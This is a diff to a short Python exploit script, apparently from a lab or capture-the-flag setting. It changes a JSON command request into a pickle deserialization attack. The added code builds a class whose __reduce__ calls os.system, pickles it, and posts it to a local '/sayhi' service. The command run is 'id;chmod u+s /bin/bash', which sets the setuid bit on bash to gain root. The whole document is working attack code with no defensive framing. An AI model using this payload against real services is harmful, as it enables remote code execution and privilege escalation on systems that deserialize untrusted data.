@@ -1,25 +1,27 @@
 import requests
-import json
+import pickle
 
 HOST = "127.0.0.1:65432"
 URL = f"http://{HOST}/sayhi"
-
-HEADERS = {
-    "Content-Type": "application/json"
+HEADERS ={
+    "serializer": "pickle"
 }
 
+def generate_payload(cmd):
+    class PickleRce(object):
+        def __reduce__(self):
+            import os
+            return os.system, (cmd,)
+    payload = pickle.dumps(PickleRce())
+    print(payload)
+    return payload
+
 def exec_command(cmd):
-    payload = {
-        "command": cmd
-    }
-    response = requests.post(url=URL, json=payload, headers=HEADERS)
-    if response.status_code == 200:
-        print("Command executed successfully. Execute '/bin/bash -p'")
-    else:
-        print(f"Failed to execute command. Status code: {response.status_code}")
+    payload = generate_payload(cmd)
+    requests.post(url=URL, data=payload, headers=HEADERS)
 
 def main():
-    exec_command('chmod u+s /bin/bash')
+    exec_command('id;chmod u+s /bin/bash')
 
 if __name__ == "__main__":
-    main()
+	main()
